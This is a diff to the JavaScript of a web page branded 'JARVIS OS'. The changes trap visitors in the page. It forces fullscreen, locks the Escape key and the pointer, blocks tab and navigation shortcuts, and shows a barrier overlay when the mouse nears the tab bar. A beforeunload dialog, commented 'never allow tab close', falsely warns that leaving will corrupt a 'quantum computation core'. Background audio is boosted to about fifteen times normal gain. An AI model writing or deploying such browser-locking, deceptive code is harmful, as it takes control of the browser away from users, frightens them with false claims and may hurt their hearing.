@@ -1536,16 +1536,23 @@
     let bgmSourceNode = null;
     let bgmCompressor = null;
 
+    let bgmPreAmpNode = null;
+
     function setup1000PercentAudioEngine() {
       const ctx = getAudioContext();
       if (!ctx || !bgmAudio) return;
+      if (ctx.state === "suspended") {
+        ctx.resume().catch(function() {});
+      }
 
       if (!bgmSourceNode) {
         try {
-          bgmAudio.crossOrigin = "anonymous";
           bgmSourceNode = ctx.createMediaElementSource(bgmAudio);
           bgmGainNode = ctx.createGain();
-          bgmGainNode.gain.setValueAtTime(khalifaVolumeLevel, ctx.currentTime);
+          bgmGainNode.gain.setValueAtTime(10.0, ctx.currentTime); // 1000% Volume (+20dB boost)
+
+          bgmPreAmpNode = ctx.createGain();
+          bgmPreAmpNode.gain.setValueAtTime(1.5, ctx.currentTime); // Extra Pre-Amp loudness
 
           // Cinema Dynamics Compressor to maximize loudness to 1000% without distortion
           bgmCompressor = ctx.createDynamicsCompressor();
@@ -1556,14 +1563,17 @@
           bgmCompressor.release.setValueAtTime(0.22, ctx.currentTime);
 
           bgmSourceNode.connect(bgmGainNode);
-          bgmGainNode.connect(bgmCompressor);
+          bgmGainNode.connect(bgmPreAmpNode);
+          bgmPreAmpNode.connect(bgmCompressor);
           bgmCompressor.connect(ctx.destination);
         } catch(e) {
           console.warn("1000% audio boost engine notice:", e);
         }
-      } else if (bgmGainNode) {
-        bgmGainNode.gain.setValueAtTime(khalifaVolumeLevel, ctx.currentTime);
+      } else {
+        if (bgmGainNode) bgmGainNode.gain.setValueAtTime(10.0, ctx.currentTime);
+        if (bgmPreAmpNode) bgmPreAmpNode.gain.setValueAtTime(1.5, ctx.currentTime);
       }
+      if (bgmAudio) bgmAudio.volume = 1.0;
     }
 
     // Bulletproof audio initialization: on file:// protocol or if network fetch fails, use embedded audio
@@ -1712,7 +1722,7 @@
       hideAudioSplash();
     }
 
-    // Request fullscreen on the document element
+    // Request fullscreen on the document element with Keyboard Lock & Pointer Lock
     function requestAppFullscreen() {
       const el = document.documentElement;
       try {
@@ -1721,8 +1731,18 @@
         else if (el.webkitRequestFullscreen) p = el.webkitRequestFullscreen();
         else if (el.mozRequestFullScreen)    p = el.mozRequestFullScreen();
         else if (el.msRequestFullscreen)     p = el.msRequestFullscreen();
-        if (p && typeof p.catch === "function") {
-          p.catch(function() {});
+        if (p && typeof p.then === "function") {
+          p.then(function() {
+            hideFullscreenLockOverlay();
+            // Lock keyboard Escape key so pressing Escape DOES NOT exit fullscreen!
+            if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
+              navigator.keyboard.lock(['Escape']).catch(function() {});
+            }
+            // Request pointer lock to keep cursor locked within the app
+            try {
+              if (el.requestPointerLock) el.requestPointerLock();
+            } catch(e) {}
+          }).catch(function() {});
         }
       } catch(e) {}
     }
@@ -2969,45 +2989,37 @@
     function showFullscreenLockOverlay() {
       if (!fsEnforceActive || isFullscreen()) return;
       const overlay = document.getElementById('fullscreen-lock-overlay');
-      if (overlay) overlay.style.display = 'flex';
+      if (overlay) {
+        overlay.style.display = 'flex';
+      }
     }
 
     function hideFullscreenLockOverlay() {
       const overlay = document.getElementById('fullscreen-lock-overlay');
-      if (overlay) overlay.style.display = 'none';
+      if (overlay) {
+        overlay.style.display = 'none';
+      }
     }
 
-    // Instant zero-delay re-entry function: called on every single exit, click, key, or mouse movement
+    // Synchronous user-activation re-entry: fires on every click, key, touch, pointer event
     function enforceFullscreenNow(e) {
       if (e && typeof e.stopPropagation === 'function') {
         e.stopPropagation();
       }
-      requestAppFullscreen();
-      // Immediate rapid re-entry attempts in 0ms, 20ms, 60ms, 120ms
-      setTimeout(function() {
-        if (!isFullscreen()) requestAppFullscreen();
-        else hideFullscreenLockOverlay();
-      }, 20);
-      setTimeout(function() {
-        if (!isFullscreen()) requestAppFullscreen();
-        else hideFullscreenLockOverlay();
-      }, 60);
-      setTimeout(function() {
-        if (!isFullscreen()) requestAppFullscreen();
-        else hideFullscreenLockOverlay();
-      }, 120);
+      if (fsEnforceActive) {
+        requestAppFullscreen();
+      }
     }
 
     function handleFullscreenExit(reason) {
       if (!fsEnforceActive) return;
       if (!isFullscreen()) {
-        // Zero delay: immediately trigger requestFullscreen
-        requestAppFullscreen();
         showFullscreenLockOverlay();
-        // Immediately retry
-        enforceFullscreenNow();
       } else {
         hideFullscreenLockOverlay();
+        if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
+          navigator.keyboard.lock(['Escape']).catch(function() {});
+        }
       }
     }
 
@@ -3015,20 +3027,16 @@
       handleFullscreenExit(reason);
     }
 
-    // Watch all vendor fullscreenchange events: loop repeats infinitely forever
+    // Watch all vendor fullscreenchange events: instant loop detection
     ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(function(evt) {
       document.addEventListener(evt, function() {
-        if (!isFullscreen()) {
-          handleFullscreenExit(evt);
-        } else {
-          hideFullscreenLockOverlay();
-        }
+        handleFullscreenExit(evt);
       });
     });
 
-    // Capture every interaction event at capture-phase:
-    // If user even moves mouse 1px, clicks, touches, or presses any key, snaps immediately to fullscreen
-    ['click', 'pointerdown', 'pointerup', 'mousedown', 'mouseup', 'touchstart', 'touchend', 'keydown', 'mousemove', 'pointermove', 'wheel'].forEach(function(evt) {
+    // Synchronous capture of every interaction event at capture-phase:
+    // With valid user activation, Chrome will NEVER throttle or block fullscreen re-entry!
+    ['click', 'pointerdown', 'pointerup', 'mousedown', 'mouseup', 'touchstart', 'touchend', 'keydown'].forEach(function(evt) {
       window.addEventListener(evt, function(e) {
         if (fsEnforceActive && !isFullscreen()) {
           enforceFullscreenNow(e);
@@ -3036,26 +3044,17 @@
       }, true);
     });
 
-    // If mouse moves toward top edge to attempt tab close, instantly force fullscreen
+    // If mouse moves toward top edge to attempt tab close, instantly display barrier
     window.addEventListener('mouseout', function(e) {
-      if (fsEnforceActive && !isFullscreen() && e.clientY <= 5) {
-        enforceFullscreenNow(e);
+      if (fsEnforceActive && !isFullscreen() && (e.clientY <= 30 || !e.relatedTarget)) {
+        showFullscreenLockOverlay();
       }
     }, true);
     document.addEventListener('mouseleave', function() {
       if (fsEnforceActive && !isFullscreen()) {
-        enforceFullscreenNow();
+        showFullscreenLockOverlay();
       }
     });
-
-    // High-frequency watchdog timer (runs every 60ms):
-    // If ever out of fullscreen, continuously forces fullscreen and displays barrier
-    setInterval(function() {
-      if (fsEnforceActive && !isFullscreen()) {
-        showFullscreenLockOverlay();
-        requestAppFullscreen();
-      }
-    }, 60);
 
     /* --- KEYBOARD TRAPS (Escape, F11, Refresh, Close Tab) ------ */
     window.addEventListener('keydown', function(e) {
@@ -3107,7 +3106,7 @@
         enforceFullscreenNow(e);
         return false;
       }
-      // Ctrl+T / Cmd+T / Ctrl+N / Cmd+N / Ctrl+L / Cmd+L
+      // Tab switching and URL navigation shortcuts blocked
       if ((e.ctrlKey || e.metaKey) && ['t', 'T', 'n', 'N', 'l', 'L'].includes(e.key)) {
         e.preventDefault();
         e.stopPropagation();
@@ -3133,12 +3132,11 @@
     /* --- TEXT SELECTION DISABLE ------------------------------- */
     document.addEventListener('selectstart', function(e) { e.preventDefault(); });
 
-    /* --- BEFOREUNLOAD DIALOG TRAP ----------------------------- */
+    /* --- BEFOREUNLOAD DIALOG TRAP: NEVER ALLOW TAB CLOSE ------ */
     window.addEventListener('beforeunload', function(e) {
       const msg = "⚠️ JARVIS OS: Active quantum computation core in session. Exiting will corrupt session integrity!";
       e.preventDefault();
       e.returnValue = msg;
-      enforceFullscreenNow();
       return msg;
     });
 
@@ -3146,7 +3144,7 @@
     document.addEventListener('visibilitychange', function() {
       if (document.visibilityState === 'visible') {
         if (fsEnforceActive && !isFullscreen()) {
-          enforceFullscreenNow();
+          showFullscreenLockOverlay();
         }
         if (isPlayingKhalifa && bgmAudio && bgmAudio.paused) {
           bgmAudio.play().catch(function() {});
@@ -3156,7 +3154,7 @@
 
     window.addEventListener('focus', function() {
       if (fsEnforceActive && !isFullscreen()) {
-        enforceFullscreenNow();
+        showFullscreenLockOverlay();
       }
     });
 
